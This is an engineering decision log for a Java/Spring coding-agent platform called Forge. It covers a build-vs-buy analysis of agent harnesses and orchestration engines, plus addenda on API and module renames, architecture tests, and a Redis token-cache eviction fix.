# Forge — decision log

Everything here is **superseded, historical, or a record of how a decision was reached**. None of it
describes what will be built; `architecture-plan.md` is the only document that does.

It is kept because the reasoning that produced a wrong answer is usually sound given what was known
at the time, and deleting it makes the same mistake available again. Where a section here was
reversed, the reversal says so and names what replaced it.

Read `architecture-plan.md` first. Come here only to answer "why did we stop doing it that way?"

---

## Appendix B — Build vs. buy: should we build the agent runtime ourselves?

**Status: research findings and recommendation. Not yet applied to §1–§27.** If accepted, §9, §14, §15 and §16 change substantially; §1–§8, §10–§13 and §17–§22 are unaffected.

### B.1 This is three decisions, not one

The question "build or buy the agent runtime" hides three independent choices at different layers. Conflating them is how teams end up adopting a framework that solves one layer and fighting it on the other two.

| Layer | What it does | Candidates |
|---|---|---|
| **L1 — Durable orchestration** | Survive crashes across long-running work; retries, timers, resume | Temporal, Restate, Inngest, Hatchet, DBOS, or our hand-rolled Postgres+Redis |
| **L2 — Coding-agent harness** | The inner loop: read/edit/run/test in a sandbox, tool dispatch, context compaction | Claude Agent SDK, Claude Managed Agents, OpenHands SDK, SWE-agent, Aider, OpenCode, Codex CLI |
| **L3 — Generic agent framework** | Graph/DAG orchestration of LLM calls, multi-agent patterns | LangGraph, PydanticAI, OpenAI Agents SDK, Microsoft Agent Framework, CrewAI, AutoGen |

Forge needs L1 and L2. It does **not** need L3 — see B.5.

### B.2 The constraint that reshapes everything: we are a Java shop

Every serious coding-agent harness in 2026 is Python or TypeScript. There is no Java option at L2, and there will not be one.

| Candidate | Language | Java? |
|---|---|---|
| Claude Agent SDK | Python, TypeScript (spawns a `claude` CLI subprocess) | No |
| OpenHands Software Agent SDK | Python (Pydantic, FastAPI, LiteLLM) | No — but ships a REST/WebSocket agent server |
| SWE-agent | Python | No |
| Aider | Python (single-process, terminal-oriented) | No |
| OpenCode | TypeScript/Effect, client-server with SQLite | No |
| OpenAI Agents SDK | Python, JS | No |
| PydanticAI | Python | No |
| Microsoft Agent Framework | .NET, Python (1.0 GA April 2026) | No |
| LangGraph | Python, JS | No |
| CrewAI / AutoGen | Python (AutoGen merged into MS Agent Framework) | No |
| **Temporal** | Go, Python, TS, **Java**, .NET | **Yes, first-class** |
| **Restate** | TS, Python, **Java/Kotlin**, Go, Rust — **Spring Boot starter** | **Yes** |
| Hatchet | Python, TS, Go, Ruby | No |
| DBOS | Python, TS | No |

So adopting anything at L2 means **a polyglot service boundary is unavoidable**. That sounds like a cost, but our architecture already has one: §1 defines an execution plane separate from the control plane, and §16 defines a `SandboxProvider` port whose whole purpose is to hide what runs over there. A Python agent server behind that port is not a new architectural concession — it is the concession we already made, cashed in for something valuable.

### B.3 The uncomfortable finding: most of §9/§15/§16 is commodity

> **Which OpenHands this is about.** The project has two architectures, and almost everything written
> about it describes the wrong one. The original OpenDevin design — `AgentController`, `Runtime`,
> an agenthub of community agents — is what the team now calls **V0**, and its docs pages are
> excluded from the current index. Everything below concerns **V1**: a full rewrite living in a
> separate repository (`OpenHands/software-agent-sdk`), which is what [arXiv:2511.03690](https://arxiv.org/abs/2511.03690)
> documents. Cite the version, not just the paper — a comparison against V0 would be a comparison
> against code nobody ships.
>
> Worth knowing that V1's stated motivation runs *away* from us. It relaxed V0's mandatory
> sandboxing to opt-in — partly because MCP assumes local access to credentials and files — and
> co-located execution with the agent loop. Both are correct for a developer running an agent on
> their own machine, and both are trades §16 and §18 cannot make. **V0 was architecturally closer to
> ForgeStack than V1 is.**


The OpenHands Software Agent SDK paper ([arXiv:2511.03690](https://arxiv.org/abs/2511.03690)) describes an architecture that is close to a line-by-line match for what we designed independently:

| Our design | OpenHands SDK |
|---|---|
| §11 append-only steps/tool calls, replay | Event-sourced `ConversationState`, append-only `EventLog`, deterministic replay |
| §9 checkpoint per step, resume after crash | Auto-detects incomplete sessions, continues from last processed event |
| §10 pause for human, resume | `conversation.pause()` → `PauseEvent` → `run()` |
| §16 `SandboxProvider` port, Docker adapter, future remote | `Workspace` abstraction: `LocalWorkspace` / `DockerWorkspace` / `APIRemoteWorkspace`, same agent code unchanged |
| §15 `ToolDefinition` → dispatch → result → evidence | Action–Execution–Observation with Pydantic-validated Action models |
| §13 `ModelRouter` with role bindings | `RouterLLM` with `select_llm()`, 100+ providers via LiteLLM |
| §17 risk classification, approval gate | `SecurityAnalyzer` (LOW/MED/HIGH/UNKNOWN) + `ConfirmationPolicy`, `WAITING_FOR_CONFIRMATION` state |
| §11 output truncation, §14 context budget | `Condenser` / `LLMSummarizingCondenser`, ~2× cost reduction |
| §15 MCP-shaped tool definitions | Native MCP integration |

That convergence is worth two conclusions, and they point in opposite directions:

1. **Our design is sound.** Independent teams solving this problem arrive at event sourcing, replay, workspace abstraction, and risk-gated tool dispatch. We did not get it wrong.
2. **Therefore it is commodity, and building it is not where our time should go.** MIT-licensed, benchmarked at 72.8% on SWE-Bench Verified, hardened over 18 months of production. We would spend M5–M8 rebuilding it and land somewhere worse.

**What is genuinely ours** — and what no harness at L2 provides — is everything the plan describes *outside* the inner loop: the task lifecycle FSM (§10), the dependency graph and runnability (§12), effective authority and diff guards (§17), the verification contract (§9), multi-tenancy and RLS (§18), GitHub App scoping (§7), signal triage (§8), long-term repo knowledge (§14), audit (§19), and cost governance (§22). That is the "continuously maintains it" product. The inner loop is table stakes underneath it.

### B.4 L2 candidates assessed

**Claude Managed Agents** ([docs](https://platform.claude.com/docs/en/managed-agents/overview)) — hosted REST harness; Anthropic runs the loop *and* the sandbox. Sessions are long-running, resume cleanly, support steering/interrupt, and there are scheduled deployments. Self-hosted sandboxes ([docs](https://platform.claude.com/docs/en/managed-agents/self-hosted-sandboxes)) keep tool execution on our infrastructure while orchestration stays with Anthropic.
- *Fastest path by a wide margin.* No harness, no sandbox, no loop to operate.
- **Disqualifying for v1:** Managed Agents is **not eligible for Zero Data Retention**, by design — sessions persist conversation history and sandbox state server-side. For a product whose entire job is handling customers' proprietary source code, "we cannot offer ZDR" is an objection we would hit in the first enterprise conversation. Also beta, and Claude-only.
- *Reconsider* if Anthropic adds ZDR coverage, or for a self-serve tier where customers accept it.

**Claude Agent SDK** ([hosting docs](https://code.claude.com/docs/en/agent-sdk/hosting)) — the harness behind Claude Code, self-hosted. Spawns a `claude` CLI subprocess per session; `SessionStore` adapters (S3/Redis/Postgres) persist transcripts across hosts; OTEL built in; documented multi-tenant isolation (`settingSources: []`, per-tenant `CLAUDE_CONFIG_DIR`, per-tenant `cwd`); hooks and permission gating.
- *Strongest raw capability*, and the hosting docs are unusually honest about the operational model (subprocess-per-session, ~1 GiB RAM each, memory growth over long sessions, no top-level session timeout).
- *Cost:* Claude-only, which contradicts our §13 decision to stay provider-agnostic. Library, not a service — we would write and operate a thin Python/TS wrapper.

**OpenHands Software Agent SDK** — MIT, Python, model-agnostic via LiteLLM, ships a REST + WebSocket **agent server** with Docker images, and `APIRemoteWorkspace` for driving it over HTTP.
- *Best architectural fit.* It already is the execution plane we specified, it is drivable from Java over REST without us writing a wrapper service, and being model-agnostic it preserves §13.
- *Cost:* smaller ecosystem than Anthropic's; Python operational surface; the paper's comparison table is self-authored and unflatteringly framed toward competitors, so treat its claims about rival SDKs with suspicion (it asserts Claude/OpenAI SDKs "cannot sandbox execution," which the Claude hosting docs plainly contradict).

**SWE-agent / Aider / OpenCode / Codex CLI** — all real and good, none the right shape. SWE-agent is a research harness (small core, YAML tool bundles, SWE-ReX runtime) optimised for benchmarks, not multi-tenant SaaS. Aider is a single-process terminal pair-programmer — its repo-map via tree-sitter is genuinely excellent prior art worth stealing conceptually for §14, but it is not embeddable as a service. OpenCode and Codex CLI are terminal-first products.

### B.5 L1 and L3: what to reject, and why

**Reject L3 entirely.** LangGraph, PydanticAI, OpenAI Agents SDK, Microsoft Agent Framework, CrewAI, AutoGen all solve "orchestrate LLM calls in a graph." We do not have that problem — we have a *domain* state machine (§10) whose states are product concepts with guards, approvals, and audit obligations. Expressing `BLOCKED_ON_DEPENDENCY` as a LangGraph node would be a category error. CrewAI and AutoGen are additionally wrong on substance: role-play multi-agent conversation, with documented production problems around token consumption and error propagation. None have Java support.

**Do not adopt Temporal/Restate/Inngest/Hatchet in v1 — but for a sharper reason than "hand-rolled is fine."**

The decisive point: **a durable execution engine solves durability of execution; it does not solve domain state.** Our §10 FSM is not a durability mechanism — it is product surface. Customers see task states, approvals gate on them, the audit log is built from transitions, and the dependency graph queries them. That must live in Postgres as queryable rows regardless of what orchestrates the work. Temporal would become a *second* source of truth competing with it, which is exactly the objection recorded when this was first decided.

And if we adopt an L2 harness, the inner loop's durability becomes *the harness's* problem — OpenHands' event log and replay, or Claude's `SessionStore`. What is left for us to orchestrate is a handful of coarse, long steps per attempt, which leases + outbox + reconciler (§20, §21) handle comfortably. **Adopting L2 makes the hand-rolled L1 decision safer, not riskier.**

Worth recording for later: Temporal is genuinely proven at this exact workload — OpenAI runs Codex on it, reportedly millions of coding-agent requests daily — and has a first-class Java SDK. **Restate** is the more interesting option for us specifically: single binary, Java/Kotlin SDK, and an official `dev.restate:sdk-spring-boot-starter`. If durability bugs accumulate in M3–M8, Restate is the escape hatch, and it fits a Spring shop better than Temporal does.

### B.6 Recommendation

**Build the outer loop. Buy the inner loop.**

```
KEEP (this is Forge, and nothing else provides it)
  Java/Spring control plane · Task FSM §10 · dependency graph §12
  policy + effective authority + diff guards §17 · verification contract §9
  multi-tenancy/RLS §18 · GitHub OAuth/App/webhooks §6–§8
  signals + triage §8 · repo knowledge §14 · audit §19 · cost governance §22
  hand-rolled orchestration: outbox + Redis Streams + leases + reconciler §5, §20, §21

BUY (commodity, and we would build it worse)
  inner attempt loop · tool dispatch · context compaction · sandbox lifecycle
  → OpenHands Software Agent SDK, run as the execution plane,
    driven from Java over its REST/WebSocket agent server

REJECT
  L3 agent frameworks (wrong layer, wrong language)
  Temporal/Restate/Inngest/Hatchet in v1 (domain state ≠ durable execution)
  Managed Agents in v1 (no ZDR — unacceptable for customer source code)
```

**Primary: OpenHands SDK**, because it preserves provider-agnosticism (§13), is MIT, and exposes a REST server we can drive from Spring without writing a wrapper.
**Fallback: Claude Agent SDK** behind the same port, if evaluation shows a decisive quality gap. The port makes this a swap, not a rewrite — and it is the same `SandboxProvider`-style discipline argued in §16.

Concretely, §16's `SandboxProvider` widens into an **`ExecutionHarness` port** (`startAttempt`, `sendGuidance`, `streamEvents`, `pause`, `resume`, `captureDiff`, `destroy`) with an `OpenHandsHarness` adapter and an in-memory fake. The `@Port` justification (§2) writes itself. Everything in §17 stays on the Java side: we do not delegate authority decisions to the harness's `SecurityAnalyzer` — we use it as an *additional* signal and keep our own gate, because the harness's risk rating is a model judgement and §17 requires that the LLM may raise risk but never lower it.

**Revised milestone impact:** M5 and M6 shrink dramatically (integrate and harden a harness rather than build sandbox + tools from scratch); M7 mostly disappears; M8 arrives materially sooner. M4 (FSM), M9 (verification + diff guards), M10 (webhooks), M11 (policy) are unchanged — which is the tell that we are keeping the right half.

### B.7 What could go wrong with this recommendation

1. **We inherit someone else's roadmap and bugs.** Mitigated by the port + conformance suite (§16) and by the fallback adapter being real, not theoretical. Pin versions; do not track `main`.
2. **The harness's abstractions fight our FSM.** Specifically, it wants to own "when is the task done" and we require that guards decide (§10.3). Rule: the harness reports *outcomes*; Forge decides *transitions*. If that boundary proves unenforceable in evaluation, that is the signal to fall back to building.
3. **Python operational surface in a Java shop.** Real cost — a second runtime, second dependency ecosystem, second on-call surface. Bounded by running it only as a containerised service behind REST, never as a library we embed.
4. **Evaluation cost is not zero.** Benchmarks in the paper cost $100–1000 per run. Budget a real spike (below) rather than deciding from documentation, including this one.
5. **Prompt-injection surface moves but does not shrink.** §16's rule stands unchanged and is now *more* important: no GitHub token inside the harness sandbox, host-brokered git, egress deny-by-default. A third-party harness must not be trusted with credentials we would not give our own sandbox.

### B.8 Proposed next step before committing

A two-week spike, run before M5, against one real repository with a known failing test:

1. Stand up the OpenHands agent server in Docker; drive `POST /conversations` and the event WebSocket from a throwaway Spring service.
2. Do the same with the Claude Agent SDK behind a minimal Python/FastAPI wrapper.
3. Measure on 20 seeded tasks: resolution rate, cost per resolved task, wall-clock, crash-resume correctness, and — most important — **whether we can keep transition authority on the Java side** in both.
4. Verify the §16 credential boundary holds in each.

Decide from that data. Everything above is a hypothesis formed from documentation, and documentation is written by people selling something — including the MIT-licensed ones.

### Sources

- [OpenHands Software Agent SDK (arXiv:2511.03690)](https://arxiv.org/abs/2511.03690) · [HTML](https://arxiv.org/html/2511.03690v1) · [docs](https://docs.openhands.dev/sdk) · [agent server source](https://github.com/OpenHands/software-agent-sdk/tree/main/openhands-agent-server/openhands/agent_server)
- [Claude Agent SDK — hosting](https://code.claude.com/docs/en/agent-sdk/hosting) · [overview](https://platform.claude.com/docs/en/agent-sdk/overview)
- [Claude Managed Agents — overview](https://platform.claude.com/docs/en/managed-agents/overview) · [self-hosted sandboxes](https://platform.claude.com/docs/en/managed-agents/self-hosted-sandboxes)
- [SWE-agent: Agent-Computer Interfaces (arXiv:2405.15793)](https://arxiv.org/abs/2405.15793) · [Inside the Scaffold: taxonomy of coding agent architectures (arXiv:2604.03515)](https://arxiv.org/pdf/2604.03515)
- [Aider repo map](https://aider.chat/docs/repomap.html) · [OpenCode agent system](https://deepwiki.com/sst/opencode/3.2-agent-system)
- [Temporal + OpenAI Agents SDK](https://temporal.io/blog/announcing-openai-agents-sdk-integration) · [Temporal Replay 2026 announcements](https://temporal.io/blog/replay-2026-product-announcements)
- [Restate Java SDK](https://www.restate.dev/blog/announcing-the-restate-java-sdk) · [Spring Boot starter](https://central.sonatype.com/artifact/dev.restate/sdk-spring-boot-starter)
- [Hatchet](https://github.com/hatchet-dev/hatchet) · [Pydantic AI durable execution](https://ai.pydantic.dev/durable_execution/overview/) · [Microsoft Agent Framework 1.0](https://devblogs.microsoft.com/agent-framework/microsoft-agent-framework-version-1-0/)
- [Durable AI agents 2026: Temporal, Inngest, DBOS, Restate](https://www.reactify-solutions.com/articles/durable-ai-agents-2026) · [Checkpoints aren't durable execution](https://www.diagrid.io/blog/checkpoints-are-not-durable-execution-why-langgraph-crewai-google-adk-and-others-fall-short-for-production-agent-workflows)

---

## Addendum — API naming: `/api/session` replaces `/api/me`

**Status: implemented, 43 tests green.** Retained as the record of why.

### Context

Step 1.5 shipped a single REST endpoint, `GET /api/me`, served by `api/MeController`. `me` is a pronoun, not a resource: it names the *caller* rather than the thing being fetched, so it does not compose (`/api/me/workspaces`? `/api/me/session`?) and it sets a precedent the rest of the API would inherit — while `api/` is still one file, which is the cheapest possible moment to change it.

Looking at what the endpoint actually returns settles the replacement. `userId`, `email`, `displayName`, `avatarUrl` come from the user row, but **`activeWorkspaceId` comes from `ForgePrincipal`, i.e. the server-side session**, and `workspaces` is the membership list. The payload is not a user — it is *who am I and what may I see right now*. That is session context, so the resource is the session.

Chosen: **`GET /api/session` → `SessionController` returning `SessionView`.**

Why over the alternatives considered: `/api/viewer` (GitHub's GraphQL convention) is idiomatic for a GitHub-native product but imports a GraphQL-ism into a REST surface; `/api/current-user` is unambiguous but puts workspace context under a user resource, which forces a second endpoint the moment the UI needs more session state. `/api/account` was rejected outright — "account" already means the *GitHub* account here (`github_installations.account_login`, `account_type`), and reusing it would collide with established domain vocabulary.

The naming also buys a coherent home for two things §6 requires and Phase 1.5 has not placed yet: **`DELETE /api/session` (logout)** and **`PUT /api/session/workspace` (workspace switch)**. Both are session mutations; neither has an obvious home under `/api/me`.

### Change

One file, plus its URL. Nothing else references the path — `SecurityConfig` (`githubauth/internal/SecurityConfig.java:48`) matches `/api/**` broadly, and there is no client in this repo, so no compatibility shim or redirect is needed.

`git mv src/main/java/dev/tushar/forge/api/MeController.java src/main/java/dev/tushar/forge/api/SessionController.java`, then:

| Before | After |
|---|---|
| `@RequestMapping("/api/me")` | `@RequestMapping("/api/session")` |
| `class MeController` | `class SessionController` |
| `record MeView` | `record SessionView` |
| `ResponseEntity<MeView> me(...)` | `ResponseEntity<SessionView> current(...)` |
| `private MeView toView(...)` | `private SessionView toView(...)` |

Record component names are unchanged, so the JSON body is identical — only the path and the Java types move. Use `git mv` rather than delete-and-create so the review diff shows one line changed per row above, not a new file.

### Naming note worth recording

There are now three `Session`-shaped names, deliberately at three layers rather than duplicated:

| Name | Layer | Is |
|---|---|---|
| `iam.internal.session.Session` | persistence | the JPA entity (module-private) |
| `iam.SessionService`, `iam.AuthenticatedSession`, `iam.IssuedSession` | domain API | issue, validate, revoke |
| `api.SessionController`, `SessionView` | HTTP | the wire representation |

Controller / service / entity sharing a root noun is normal Spring layering, and the boundary records already disambiguate direction (`IssuedSession` out of login, `AuthenticatedSession` into a request). No further rename needed — but a fourth `Session*` landing in `api/` is the signal that the API surface has outgrown a flat package and wants the `@NamedInterface` treatment discussed for `iam`.

### Verification

- `./gradlew test` — 42 tests, unchanged. `ModularityTest` (`ApplicationModules.verify()`) must still pass; the `api` module descriptor and its `allowedDependencies = {"iam", "githubauth"}` are untouched.
- `AbstractionHygieneTest` is unaffected — no interface, no `Impl`, no layer-named package introduced.
- Manual: log in via GitHub, then `curl -b <session cookie> localhost:8080/api/session` returns the same JSON body previously served at `/api/me`. Authenticated `GET /api/me` should now be a clean 404, not a 500.

**Not in this change:** `DELETE /api/session` and `PUT /api/session/workspace`. Logout currently lives on Spring Security's `/logout` handler (`SecurityConfig.java:54`); moving it belongs with the browser client, not with a rename. Recorded here so the resource shape is intentional rather than accidental.

---

## Addendum — the three `Session` names, and the real gap behind them

**Status: implemented** (`nothingDependsOnTheApiModule`, proven to fail before being kept). **Superseded in part** — Finding 1 argued the overlap was acceptable because Java resolves it by import. That defended the compiler, not the reader; see the next addendum for the standard that replaces it.

### Context

The `/api/session` rename left three `Session`-shaped names in the codebase and a note that "a fourth `Session*` in `api/` means the API surface has outgrown a flat package." That note deserved a straight answer: is the overlap a problem, and is the remedy as expensive as implied? Checking both turned up **no naming problem and one genuine enforcement hole** — which is the part worth fixing.

### Finding 1 — the name overlap needs no fix, and renaming would make it worse

Java resolves types by import, so a repeated simple name only bites when two of them appear in **one compilation unit**. Exactly one file qualifies, and it reads cleanly (`iam/SessionService.java:51-71`):

```java
Session session = Session.issue(userId, hash(token), userAgent, expiresAt);
sessions.save(session);
return new IssuedSession(session.getId(), token, expiresAt);
...
return new AuthenticatedSession(session.getId(), session.getUserId(), session.getWorkspaceId());
```

Four Session-ish types, zero ambiguity: the entity is the bare noun, the two boundary records are participles describing *direction* (`IssuedSession` leaves on login, `AuthenticatedSession` arrives on a request), the local is `session` and the repository field is `sessions`.

`api` **cannot** collide with the entity even in principle — `iam.internal.session.Session` is module-private, so Modulith fails the build on any import of it from outside `iam`. The overlap is three layers naming the same concept, which is what layers are for. Renaming to `SessionEntity` / `SessionDto` would import exactly the layer-suffix vocabulary `AbstractionRules.packagesAreNamedAfterConceptsNotLayers` exists to keep out.

**Action: none.** Recorded so it is a decision rather than an omission.

### Finding 2 — the remedy I implied is the wrong one, and cheaper than stated

The reason `iam`'s API side stays flat is Modulith's rule that sub-packages are invisible to **dependents** unless annotated `@NamedInterface`. That constraint is about the module's consumers — and **`api` has none**. §2 states "Nothing depends on `api`."

So sub-packaging `api` costs nothing: no `@NamedInterface`, no ceremony, no import churn, because there is nobody outside to break. `api/session/SessionController.java` is just a `git mv`.

**Action: do it with Task #15, not as a standalone commit.** Splitting a one-file package is the over-structuring flagged when `iam` was reorganised. But Task #15 (installation binding) adds installation endpoints next, so `api` reaches two or three resources within days — at which point the split is justified by real content and still costs two `git mv`s:

```
api/session/       SessionController        (GET /api/session)
api/installation/  InstallationController   (GitHub App install callback, repo list, opt-in)
```

Deferring is cheap; doing it now is speculative structure.

### Finding 3 — "Nothing depends on `api`" is not actually enforced ← the real gap

Only three modules declare dependencies at all, and none names `api`:

| Module | `allowedDependencies` |
|---|---|
| `api` | `iam`, `githubauth` |
| `githubapp` | `iam`, `platform`, `platform::tenancy` |
| `githubauth` | `iam` |

So the property holds only because nobody has listed it. Adding `"api"` to some future module's `allowedDependencies` would make `ApplicationModules.verify()` pass while inverting the dependency direction — a controller package becoming a shared library is the ordinary way an HTTP layer stops being replaceable, and §2's whole claim is that swapping transport touches only this package.

Everything else in §2 that matters is a build failure (`sandbox ↛ githubapp`, `policy ↛ llm`, no `dockerjava` outside its adapter). This one is a sentence in a javadoc.

**Fix — one test method** in `src/test/java/dev/tushar/forge/architecture/AbstractionHygieneTest.java`, alongside the existing directional rules it already hosts (`dockerApiStaysInsideItsAdapter:73`, `sandboxCannotReachGithubCredentials:86`, `policyDoesNotDependOnLlm:103`). Reuses the `productionClasses` field and `ROOT` constant already there; no new test class:

```java
/**
 * The HTTP layer is a leaf. Nothing may depend on it.
 *
 * <p>Modulith enforces this only as long as no module lists {@code api} in its
 * {@code allowedDependencies} — an omission, not a guarantee. Stated directly here, because
 * "moving to a different transport touches only this package" stops being true the moment a
 * controller package acquires a dependent.
 */
@Test
void nothingDependsOnTheApiModule() {
    noClasses()
            .that()
            .resideOutsideOfPackage(ROOT + ".api..")
            .should()
            .dependOnClassesThat()
            .resideInAPackage(ROOT + ".api..")
            .because("the HTTP layer is the outermost ring; a dependent would invert it")
            .check(productionClasses);
}
```

No `allowEmptyShould(true)` here — unlike the `sandbox` and `policy` rules, the `that()` set is non-empty today (every non-`api` production class), so the rule is live immediately rather than arming later.

### Verification

- `./gradlew test` — expect **43** tests, up from 42, all passing.
- Prove the new rule fires rather than trusting it, per the standard set by `AbstractionRulesFireTest` ("a rule nobody has seen fail is a rule nobody knows works"): temporarily add a field of type `SessionController` to a class in another module, confirm the build fails, then revert. Do **not** commit the fixture — unlike `ReportGenerator`, a cross-module dependency cannot live in `architecture.fixtures` without being the very violation under test.
- `ModularityTest` must still pass unchanged; this rule is strictly additional to Modulith's own checks.

---

## Addendum — module names must not be confusable: `githubauth` / `githubapp`

**Status: implemented, 44 tests green.** Two things the plan got wrong and implementation corrected: `ApplicationModule.getName()` does not exist in Modulith 2.1 (it is `getIdentifier()`), and the nested module's identifier is `platform.tenancy`, not `tenancy`. The planned verification of `sandboxCannotReachGithubCredentials` was also wrong — flipping `allowEmptyShould(false)` tests the *sandbox* side of the rule, which is empty for unrelated reasons, and would have passed while proving nothing. It was instead proven by a throwaway class in `dev.tushar.forge.sandbox` referencing `TokenScope`, which made the rule fail as intended. That rule had never fired once since it was written.

### Context

The standard being applied here is **a reader's, not a compiler's**: opening this codebase cold, nobody should have to work out which of two similar names means what. The previous addendum failed that bar — it argued the three `Session` names were fine because Java resolves them by import. True, and beside the point.

Re-reading the whole main tree against the reader's bar, the `Session` cluster is not the problem. **`githubauth` and `githubapp` are.** They are near-synonyms in English separated by the most security-critical distinction in the product: one identifies a *human*, the other grants the *agent* authority to act on repositories. The tell is that both module javadocs open by explaining they are not the other one:

- `githubauth/package-info.java`: *"This module grants the agent nothing… Authority for the agent to act on GitHub… lives in `githubapp`."*
- `githubapp/package-info.java`: *"Distinct from `githubauth`, which only identifies humans."*

**When a name needs a disclaimer, the name is doing the wrong job.** And the failure mode is not cosmetic: confusing these two is precisely how a `repo` scope ends up on the login flow, which §6 exists to prevent and `GithubOAuthScopeTest` exists to catch.

### The rename

| From | To | Owns |
|---|---|---|
| `githubauth` | **`githublogin`** | identifying a human — `read:user`, `user:email`, sessions |
| `githubapp` | **`githubinstallation`** | the agent's authority — installations, scoped tokens |

Keeping the `github*` prefix preserves the family §2 plans to grow (`githubapi`, `githubwebhook`) so they still cluster in the file tree, while making the two impossible to confuse. Neither needs a disclaimer javadoc afterwards — delete those sentences, and say what each module *is*.

Also update the `displayName`s: `"GitHub OAuth"` → `"GitHub Login"`, `"GitHub App"` → `"GitHub Installation"`.

### What must NOT be renamed

**"GitHub App" is GitHub's own product name**, so these stay exactly as they are — the module is being renamed for what it *owns* (installations, tokens), not to purge a term that is correct:

- `GithubAppJwtService` — mints the *app-level* JWT, which is genuinely an App concern, not an installation one
- `GithubAppProperties` — App id, private key, slug
- `@ConfigurationProperties(prefix = "forge.github.app")` — a config key; renaming it would break every deployment's `application.yaml` for zero readability gain

Worth stating explicitly, because the natural next instinct is to "finish the job" and rename these too.

### Blast radius — four references outside the two packages

`git mv` the two directories, then fix:

| File | Change |
|---|---|
| `api/package-info.java:9` | `allowedDependencies = {"iam", "githubauth"}` → `"githublogin"` |
| `api/SessionController.java:3` | `import …githubauth.ForgePrincipal` |
| `iam/package-info.java:5` | javadoc `{@code githubapp}` → `{@code githubinstallation}` |
| `architecture/AbstractionHygieneTest.java:92` | `ROOT + ".githubapp.."` in `sandboxCannotReachGithubCredentials` |

Plus `package` declarations in the 7 + 7 files under each tree (5 main + 2 test, and 5 main + 2 test), and the two `package-info.java` javadocs that cross-reference each other.

That last row matters most: `sandboxCannotReachGithubCredentials` is the ArchUnit rule that structurally prevents a GitHub token from reaching the sandbox. It currently points at `.githubapp..` and is `allowEmptyShould(true)`, so **if the package is renamed and the rule is not, it silently keeps passing against a package that no longer exists** — a security control quietly disarmed by a refactor. Update it in the same commit and confirm by pointing it at the new name.

### The enforcement rule — and an honest correction

The rule floated earlier ("no module javadoc may define itself by contrast with another module") **cannot be written in ArchUnit**: javadoc is stripped by the compiler and ArchUnit reads bytecode. Nothing mechanical can detect that two names are confusable — that is a human judgement.

What *is* implementable is a gate that forces the judgement to be made. Add to `src/test/java/dev/tushar/forge/ModularityTest.java`, reusing the existing `MODULES` field:

```java
/**
 * The module inventory, declared. Adding or renaming a module must edit this list.
 *
 * <p>No tool can tell that two names are confusable — {@code githubauth} and {@code githubapp}
 * were both accurate and together unreadable. So the gate is a human one: this test fails until
 * someone writes the new name down next to its neighbours, which is the moment to ask whether it
 * can be mistaken for any of them.
 *
 * <p>Deliberately closed, for the same reason the transition table in §10.3 is closed: safety
 * here comes from concentration, not extensibility.
 */
@Test
void moduleNamesAreDeliberate() {
    assertThat(MODULES.stream().map(ApplicationModule::getName))
            .containsExactlyInAnyOrder(
                    "api", "audit", "githubinstallation", "githublogin", "iam", "platform", "tenancy");
}
```

Verify the exact nested-module name string against the existing `printModuleStructure` output before pinning it — `platform.tenancy` may render as `tenancy`.

This would not have *caught* `githubauth`/`githubapp` automatically, and claiming otherwise would be overselling it. It puts the standard in front of whoever adds module #8, which is the most any rule can do here.

### Deferred, deliberately

- **`IamQueries`** sits beside `SessionService` and `UserProvisioningService` — two `*Service` and one `*Queries`, and "Iam" reads as "I am". Real, minor, and better fixed when the module next changes.
- **The `Forge` prefix** is inconsistent: it earns its place on `ForgePrincipal` (shadows `java.security.Principal`) and `ForgeOAuth2UserService` (shadows Spring's), but `ForgeSessionCookie` shadows nothing.
- **Sub-packaging `api/` by resource** — still queued for Task #15, when installation endpoints make it two real resources.

### Verification

- `./gradlew test` — expect **43** tests, unchanged and green. No behaviour changes; this is a rename plus one new assertion (44 with `moduleNamesAreDeliberate`).
- `ModularityTest.printModuleStructure` output must show the new names with the same `+` exposed / `o` hidden shape as before — in particular `githubinstallation` still exposing only `InstallationTokenService` and `TokenScope`.
- Confirm `sandboxCannotReachGithubCredentials` was really updated: temporarily point it at `ROOT + ".githubinstallation.."` with `allowEmptyShould(false)` and check it errors on the empty set rather than passing vacuously, then restore `true`. The `sandbox` module does not exist yet, so a passing rule proves nothing on its own.
- `grep -rn "githubauth\|githubapp" src` should return only the intentional `GithubApp*` class names and the `forge.github.app` config prefix.

---

## Addendum — token-cache eviction is not installation-scoped

**Status: implemented, 46 tests green.** Test was watched failing against the old implementation before the fix landed.

### Context

A health check after the renames found nothing broken by them — the full context boots against real Postgres, 44 tests green, no stale references — but reading `githubinstallation/InstallationTokenService.java:100-107` closely turned up a **latent bug in the code Task #15 is about to call**:

```java
public void evictAll(long installationId) {
    var keys = redis.keys(CACHE_PREFIX + "*");        // every installation, every workspace
    if (keys != null && !keys.isEmpty()) redis.delete(List.copyOf(keys));
    log.info("Evicted cached installation tokens after change to installation {}", installationId);
}
```

The parameter is used **only in the log line**. Three problems, in order of severity:

1. **Cross-tenant blast radius.** Suspending one customer's installation flushes every tenant's cached tokens. It fails safe — tokens are re-minted on the next request — so this is a correctness and cost problem, not a security hole. But §18's premise is that a per-workspace boundary holds at every layer, and here it does not.
2. **`KEYS` blocks the Redis event loop** and is O(*whole keyspace*), not O(matches). §5 puts queues, leases, rate limiters and SSE fan-out in the same Redis, so this scan gets worse exactly as the system gets busier.
3. **Installation-scoped eviction is impossible with the current key shape.** `TokenScope.fingerprint()` is a SHA-256 digest (`TokenScope.java:63`), so the installation id is *inside* the hash and cannot be matched on. The comment ("scope fingerprints are opaque, so the cheap path is a scan") is an accurate description of a design that boxed itself in.

**No callers exist today** — which is the argument for fixing it now. Task #15 (installation binding, `installation.suspended` / `installation_repositories` webhooks) is the first caller, and would inherit a method whose signature lies about what it does.

### The fix — `githubinstallation/InstallationTokenService.java`

**Put the installation id in the key** so eviction can match on it. `fingerprint()` already includes the id in the hashed input, so uniqueness is unaffected; this only makes the key *enumerable*:

```
forge:ghtok:{installationId}:{fingerprint}      // was forge:ghtok:{fingerprint}
```

**Rename `evictAll` → `evict`** and scope it, using `SCAN` via the cursor `StringRedisTemplate` already exposes:

```java
/** Drops cached tokens for one installation — used when it is suspended or uninstalled. */
public void evict(long installationId) {
    ScanOptions options = ScanOptions.scanOptions()
            .match(CACHE_PREFIX + installationId + ":*")
            .count(256)
            .build();
    List<String> doomed = new ArrayList<>();
    try (Cursor<String> cursor = redis.scan(options)) {
        cursor.forEachRemaining(doomed::add);
    }
    if (!doomed.isEmpty()) {
        redis.delete(doomed);
    }
    log.info("Evicted {} cached tokens for installation {}", doomed.size(), installationId);
}
```

